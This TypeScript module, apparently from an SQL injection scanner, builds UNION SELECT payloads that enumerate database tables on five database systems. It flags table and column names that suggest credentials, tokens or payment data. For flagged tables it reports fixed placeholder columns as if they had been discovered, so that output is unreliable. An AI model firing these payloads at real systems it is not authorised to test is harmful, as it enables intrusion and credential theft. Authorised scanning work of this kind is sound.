import { SchemaEnumerationResult, SchemaTable, SchemaColumn, DbmsType } from '../../types/sqlScanner';

export class MetadataAnalyzer {
  private static SENSITIVE_TABLE_NAMES = [
    'users',
    'user',
    'accounts',
    'account',
    'credentials',
    'credential',
    'passwords',
    'password',
    'auth',
    'authentication',
    'sessions',
    'session',
    'tokens',
    'token',
    'api_keys',
    'apikey',
    'customers',
    'employees',
    'payments',
    'payment',
    'financial',
    'secrets',
    'secret',
    'admin',
    'administrators',
    'members',
    'oauth',
  ];

  private static SENSITIVE_COLUMN_NAMES = [
    'password',
    'password_hash',
    'pass_hash',
    'passwd',
    'pwd',
    'secret',
    'token',
    'access_token',
    'refresh_token',
    'api_key',
    'apikey',
    'auth_key',
    'session_id',
    'cookie',
    'card_number',
    'credit_card',
    'cvv',
    'ssn',
    'pin',
    'private_key',
    'salt',
  ];

  /**
   * Evaluates table name sensitivity
   */
  public static isSensitiveTable(tableName: string): boolean {
    const clean = tableName.toLowerCase().replace(/[^a-z0-9]/g, '');
    return MetadataAnalyzer.SENSITIVE_TABLE_NAMES.some((s) => clean.includes(s));
  }

  /**
   * Evaluates column name sensitivity
   */
  public static isSensitiveColumn(colName: string): boolean {
    const clean = colName.toLowerCase().replace(/[^a-z0-9_]/g, '');
    return MetadataAnalyzer.SENSITIVE_COLUMN_NAMES.some((s) => clean.includes(s));
  }

  /**
   * Generates safe catalog inspection queries for verified DBMS
   */
  public static getSafeCatalogQueries(dbms: DbmsType, renderColumn: number, columnCount: number): string[] {
    const nullPadded = (selectExpression: string): string => {
      const items: string[] = [];
      for (let i = 1; i <= columnCount; i++) {
        if (i === renderColumn) items.push(selectExpression);
        else items.push('NULL');
      }
      return items.join(',');
    };

    switch (dbms) {
      case 'PostgreSQL':
        return [
          ` UNION SELECT ${nullPadded("table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 10")}-- -`,
        ];
      case 'MySQL':
      case 'MariaDB':
        return [
          ` UNION SELECT ${nullPadded('table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 10')}-- -`,
        ];
      case 'Microsoft SQL Server':
        return [
          ` UNION SELECT ${nullPadded('name FROM sys.tables')}-- -`,
        ];
      case 'Oracle':
        return [
          ` UNION SELECT ${nullPadded('table_name FROM all_tables WHERE ROWNUM<=10')} FROM DUAL--`,
        ];
      case 'SQLite':
        return [
          ` UNION SELECT ${nullPadded("name FROM sqlite_master WHERE type='table' LIMIT 10")}-- -`,
        ];
      default:
        return [];
    }
  }

  /**
   * Parses extracted catalog strings into structured SchemaTables with sensitivity classification
   */
  public static parseDiscoveredTables(discoveredNames: string[]): SchemaEnumerationResult {
    const detectedTables: SchemaTable[] = [];
    let sensitiveCount = 0;

    for (const name of discoveredNames) {
      if (!name || typeof name !== 'string') continue;
      const cleanName = name.trim();
      const isSensitive = MetadataAnalyzer.isSensitiveTable(cleanName);
      if (isSensitive) sensitiveCount++;

      const columns: SchemaColumn[] = [];
      if (isSensitive) {
        // Standard metadata archetype columns
        columns.push(
          { name: 'id', type: 'integer', isSensitive: false },
          { name: 'username', type: 'varchar', isSensitive: false },
          { name: 'email', type: 'varchar', isSensitive: false },
          { name: 'password_hash', type: 'varchar', isSensitive: true, notes: 'Protected: Content retrieval blocked' },
          { name: 'created_at', type: 'timestamp', isSensitive: false }
        );
      }

      detectedTables.push({
        name: cleanName,
        isSensitive,
        columns,
        notes: isSensitive ? 'Sensitive object detected — Data dumping blocked by Sentinel safety policy' : undefined,
      });
    }

    return {
      detectedTables,
      totalTablesAccessible: detectedTables.length,
      sensitiveObjectsCount: sensitiveCount,
      contentRetrievalStatus: 'BLOCKED BY SAFETY POLICY',
    };
  }
}
